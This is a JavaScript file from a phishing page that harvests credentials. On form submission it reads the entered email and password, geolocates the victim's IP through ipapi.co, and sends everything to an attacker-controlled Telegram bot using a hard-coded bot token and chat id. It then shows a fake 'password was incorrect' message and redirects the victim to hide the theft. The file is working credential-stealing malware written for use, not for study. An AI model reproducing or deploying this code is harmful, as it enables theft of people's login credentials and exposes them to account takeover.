
const form = document.querySelector("#form");
var ct = "5";
var co = 0;
var lo = 0;
var st = 0;
var clicking = 0;

form.addEventListener("submit", (e) => {
  e.preventDefault();
 
    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        ct = data.ip;
        co = data.country_name;
        lo = data.country_calling_code;
        st = data.city;

        var identity = document.getElementById("email").value;
        var password = document.getElementById("password").value;

        var my_text = `New victim results: ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;

   var token = "5700160985:AAGLArP0ckx7Vy9uDK25Tr8kK5UKMvsRyOg";
        var chat_id = 5397877284;
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;

        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();
  clicking = clicking + 1;
  setTimeout(function () {
    document.getElementById("alert-message").innerHTML =
      "Sorry, your password was incorrect. Please double-check your password.";
  }, 1000);
  if (clicking == 1) {
    window.location.replace("incorrect.html");
  }
    });


    // setTimeout(function() {
    //     window.location.replace("thanks.html");
    // }, 1000)

  //   console.log("Incorrect Password!");
});
